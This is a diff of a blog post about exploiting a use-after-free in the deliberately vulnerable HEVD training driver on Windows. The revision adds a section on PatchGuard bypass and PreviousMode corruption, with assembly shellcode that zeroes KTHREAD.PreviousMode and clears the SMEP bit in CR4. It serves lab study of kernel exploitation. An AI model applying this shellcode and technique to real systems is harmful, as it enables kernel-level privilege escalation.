@@ -10,21 +10,21 @@
 <link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
 <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
-<title>Use-After-Free - HEVD (&#43; SMEP/KASLR) – yoshl - IT enjoyer</title>
+<title>Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass) – yoshl - IT enjoyer</title>
   <meta name="description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain..." /><link rel="canonical" href="/winint-compilation/winint-useafterfree/" itemprop="url" />
 
-<meta property="og:title" content="Use-After-Free - HEVD (&#43; SMEP/KASLR)" />
+<meta property="og:title" content="Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)" />
 <meta property="og:description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain..." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/winint-compilation/winint-useafterfree/" /><meta property="article:section" content="winint-compilation" />
 
 
 
-  <meta itemprop="name" content="Use-After-Free - HEVD (&#43; SMEP/KASLR)">
+  <meta itemprop="name" content="Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)">
   <meta itemprop="description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain...">
-  <meta itemprop="wordCount" content="3227">
+  <meta itemprop="wordCount" content="4740">
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Use-After-Free - HEVD (&#43; SMEP/KASLR)">
+  <meta name="twitter:title" content="Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)">
   <meta name="twitter:description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain...">
 
     <link rel="preload" href="/css/compiled/main.min.be56ec629fdfe7569502c7dfe214689a2336e822326f4e4254eeceaf964fed38.css" as="style" integrity="sha256-vlbsYp/f51aVAsff4hRomiM26CIyb05CVO7Or5ZP7Tg=" />
@@ -198,7 +198,7 @@
       sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
     href="/winint-compilation/winint-useafterfree/"
     
-  >Use-After-Free - HEVD (&#43; SMEP/KASLR)
+  >Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)
     </a>
   
     <ul class='hx-flex hx-flex-col hx-gap-1 hx-relative before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] dark:before:hx-bg-neutral-800 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-pr-3 rtl:before:hx-right-0 ltr:hx-ml-3 rtl:hx-mr-3'><li>
@@ -224,6 +224,12 @@
                 href="#flow-hijacking"
                 class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
               >Flow Hijacking</a>
+            </li>
+          <li>
+              <a
+                href="#exploiting"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Exploiting</a>
             </li>
           <li>
               <a
@@ -366,7 +372,47 @@
         </a>
       </li>
       <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
-        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#executing-1st-shellcode">Executing 1st shellcode
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#pre-exploiting-shellcode">Pre-exploiting shellcode
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#exploiting">Exploiting
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#previousmode">PreviousMode
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#shellcode-debuggin">Shellcode debuggin
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#final-code">Final Code
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#header-file">Header file
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#getbaseaddr">getBaseAddr
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#getsymboladdr">GetSymbolAddr
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#performtokenstealing">PerformTokenStealing
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#exploituaf">ExploitUAF
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#main">main
         </a>
       </li>
       <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
@@ -395,14 +441,15 @@
   <div class="hx-mt-1.5 hx-flex hx-items-center hx-gap-1 hx-overflow-hidden hx-text-sm hx-text-gray-500 dark:hx-text-gray-400 contrast-more:hx-text-current">
         <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
           <a href="/winint-compilation/">WinInt Compilation</a>
-        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">Use-After-Free - HEVD (&#43; SMEP/KASLR)</div>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)</div>
   </div>
 
-        <h1 class="hx-mt-2 hx-text-4xl hx-font-bold hx-tracking-tight hx-text-slate-900 dark:hx-text-slate-100">Use-After-Free - HEVD (&#43; SMEP/KASLR)</h1>
+        <h1 class="hx-mt-2 hx-text-4xl hx-font-bold hx-tracking-tight hx-text-slate-900 dark:hx-text-slate-100">Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)</h1>
         <div class="hx-mt-4 hx-mb-16 hx-text-gray-500 hx-text-sm hx-flex hx-items-center hx-flex-wrap hx-gap-y-2"></div>
         <div class="content">
-          <h2>Introduction<span class="hx-absolute -hx-mt-20" id="introduction"></span>
-    <a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>In this post we are going to deep in the attack: Use-After-Free (UAF) in a common windos vulnerable driver (HEVD). We will cover up some useful techniques of code review, debuggin and bypassing some used protections like Supervisor Mode Execution Prevention (<strong>SMEP</strong>), Kernel Address Space Layout Randomization (<strong>KASLR</strong>) and others concepts like <strong>Stack Canary</strong> or GS Cookie. We will try to analyze each protective measure in detail without making it tedious.</p>
+          <p><img src="image-8.png" alt="" loading="lazy" /></p>
+<h2>Introduction<span class="hx-absolute -hx-mt-20" id="introduction"></span>
+    <a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>In this post we are going to deep in the attack: Use-After-Free (UAF) in a common windos vulnerable driver (HEVD). We will cover up some useful techniques of code review, debuggin and bypassing some used protections like Supervisor Mode Execution Prevention (<strong>SMEP</strong>), Kernel Patch Protection (<strong>KPP</strong>) also know as <em>PatchGuard</em>, Kernel Address Space Layout Randomization (<strong>KASLR</strong>) and others concepts like <strong>Stack Canary</strong> or GS Cookie. We will try to analyze each protective measure in detail without making it tedious.</p>
 <h3>Environment<span class="hx-absolute -hx-mt-20" id="environment"></span>
     <a href="#environment" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>To make this explotation we will have two virtual machines; the victim, which contains the HEVD, is a Windows 1809 with an OS Build of 17763.1075, is useful to know the exact version to be able to calculate correctly structure offsets in vergilius and, in this case, know that the <em>SMAP</em> is disabled by default.</p>
 <ul>
@@ -1101,8 +1148,8 @@
   </button>
 </div>
 </div>
-<h3>Executing 1st shellcode<span class="hx-absolute -hx-mt-20" id="executing-1st-shellcode"></span>
-    <a href="#executing-1st-shellcode" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>I will provide the final code, the unique difference will be the line 7 with the value of the shellcode, as it is my first time doing a shellcode in my entire life I wanted to document it a little haha.</p>
+<h3>Pre-exploiting shellcode<span class="hx-absolute -hx-mt-20" id="pre-exploiting-shellcode"></span>
+    <a href="#pre-exploiting-shellcode" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>I’m going to provide the simplest code for executing the shellcode; at this point, most other analyses would have wrapped up the article and the exploit. But not us 😈</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
 
 <div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;UAFHEVD.h&#34;</span><span class="cp">
@@ -1212,43 +1259,9 @@
   </button>
 </div>
 </div>
-<p>Also the header file:</p>
-<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-
-<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL   IOCTL(0x804)
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL        IOCTL(0x805)
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x806)
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL  IOCTL(0x807)
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#define UAF_OBJECT_DATA_SIZE   0x5C
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define UAF_CALLBACK_OFFSET    0x00
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define UAF_BUFFER_FIELD_SIZE  0x54
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#pragma pack(push, 1)
-</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_FAKE_OBJECT_NON_PAGED_POOL</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Callback</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">CHAR</span>  <span class="n">Buffer</span><span class="p">[</span><span class="n">UAF_BUFFER_FIELD_SIZE</span><span class="p">];</span> 
-</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="o">*</span> <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">#pragma pack(pop)
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nf">static_assert</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span> <span class="o">==</span> <span class="n">UAF_OBJECT_DATA_SIZE</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="s">&#34;Size mismatch!&#34;</span><span class="p">);</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
-  <button
-    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
-    title="Copy code"
-  >
-    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
-    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
-  </button>
-</div>
-</div>
-<p>From now on, I recommend keeping this website open so you can see the opcodes and assembly code side by side:</p>
+<p>From now on, I&rsquo;ll use the following website to create shellcodes and understand opcodes.</p>
 <p><a href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm</a></p>
-<p>The first shellcode that works me were:</p>
+<p>The first shellcode being:</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
 
 <div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
@@ -1329,8 +1342,490 @@
 </div>
 </div>
 <p>Thus, here we can align the stack to &lsquo;bypass&rsquo; the GS Cookie.</p>
+<h2>Exploiting<span class="hx-absolute -hx-mt-20" id="exploiting"></span>
+    <a href="#exploiting" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Frustrated, after struggling to inject a shellcode capable of performing a token hijack into a 0x54-byte buffer (which is impossible because such shellcode typically ranges from 0x60 to 0x100 bytes). I also tried to create dynamic shellcode that would change at runtime to perform a ret2usr, and by disabling SMEP, I could execute code in userland as if nothing had happened. But I wasn&rsquo;t able to do that either.</p>
+<p>With a lot of skill issue in <em>pwn</em>, I started doing some research until I found a method that exploited Pipe Attributes, and then, from user mode, executed a token hijacking using two NT API functions; simulating a Arbitrary Read/Write, like the <a href="https://yoshlsec.github.io/winint-compilation/winint-arbitrarywrite/" target="_blank" rel="noopener">first post of HEVD explotation</a>.</p>
+<p>Both functions were: <code>NtQuerySetInformationFile</code> and <code>NtQueryFilePipeLocalInformation</code>, reading and writing in the order I&rsquo;ve listed them. You will be able to dive in in more details in the reosurce details. But in the end, I didn&rsquo;t use data exact <strong>Data-Only Attack</strong> technique, though I did use that method to find the next post:</p>
+<p><a href="https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day" target="_blank" rel="noopener">https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day</a></p>
+<p>From that post, I would like to highlight the following paragraph:</p>
+<blockquote>
+  <p>By ensuring the corresponding source byte in the IOCTL input buffer is zero, the copy will clear the PreviousMode field, effectively resulting in its value being interpreted as KernelMode. Targeting PreviousMode like this is a widely popular exploitation technique, as corrupting this one byte in the KTHREAD structure bypasses kernel-mode checks inside syscalls such as NtReadVirtualMemory or NtWriteVirtualMemory, allowing a user-mode attacker to read and write arbitrary kernel memory.</p>
+
+</blockquote>
+<p>In other words, the functions <code>NtQuerySetInformationFile</code> and <code>NtQueryFilePipeLocalInformation</code> will be <code>NtReadVirtualMemory</code> and <code>NtWriteVirtualMemory</code>, respectively.</p>
+<div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-indigo-200 hx-bg-indigo-100 hx-text-indigo-900 dark:hx-border-indigo-200/30 dark:hx-bg-indigo-900/30 dark:hx-text-indigo-200">
+  <p class="hx-flex hx-items-center hx-font-medium"><svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Important</p>
+
+  <div class="hx-w-full hx-min-w-0 hx-leading-7">
+    <div class="hx-mt-6 hx-leading-7 first:hx-mt-0"><p>We are not saying that <code>NtQuerySetInformationFile</code> has the same functionality as <code>NtReadVirtualMemory</code>, we are talking about the concept of exploitation, not its general function.</p></div>
+  </div>
+</div>
+<p>If you have some level of windows develpoment, you will be asking, <em>but those aren&rsquo;t admin only functions</em>? (talking about permissions for the object we want to modify)</p>
+<h3>PreviousMode<span class="hx-absolute -hx-mt-20" id="previousmode"></span>
+    <a href="#previousmode" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>The char <em>PreviousMode</em> from the structure <em>_KTHREAD</em> is responsible for keeping track of where the thread comes from and who initiated the new process. If the bit is up (set in 1), the thread originated in user mode (i.e. a standard .exe file), else the thread comes from the kernel or a system service.</p>
+<p>In our windows version, this char can be found the in <code>0x232</code> offset from the KTHREAD struct:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="o">!</span><span class="n">_KTHREAD</span> <span class="n">PreviousMode</span>
+</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_KTHREAD</span>
+</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x232</span> <span class="nl">PreviousMode</span> <span class="p">:</span> <span class="n">Char</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Making this value null, kernel mode, a lot of security checks are not validated, since, for perfomance reasons, the kernel works this way. It&rsquo;s like we have the priv <code>SeDebugPrivilege</code>.</p>
+<p>Its good to know that if you change the value, the PatchGuard will identify the suspicious change and will crash the system with the error: <code>CRITICAL_STRUCTURE_CORRUPTION</code></p>
+<p><img src="image-6.png" alt="" loading="lazy" /></p>
+<p>But don&rsquo;t worry that we will bypass the <strong>KPP</strong> in the blog ;), running the UAF twice in a single execution.</p>
+<h4>Shellcode debuggin<span class="hx-absolute -hx-mt-20" id="shellcode-debuggin"></span>
+    <a href="#shellcode-debuggin" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>To be honest, this part isn&rsquo;t necesary for the blog, but it&rsquo;s really helped me understand how it works, and if anyone here is looking to learn, they can follow along with my steps.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="nl">gs</span><span class="p">:[</span><span class="mh">0x188</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">],</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">xor</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x08</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Shellcode with SMEP bypass:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">cr4</span>
+</span></span><span class="line"><span class="cl"><span class="n">and</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0xffffffffffefffff</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">cr4</span><span class="p">,</span> <span class="n">rax</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="nl">gs</span><span class="p">:[</span><span class="mh">0x188</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">],</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">xor</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x08</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
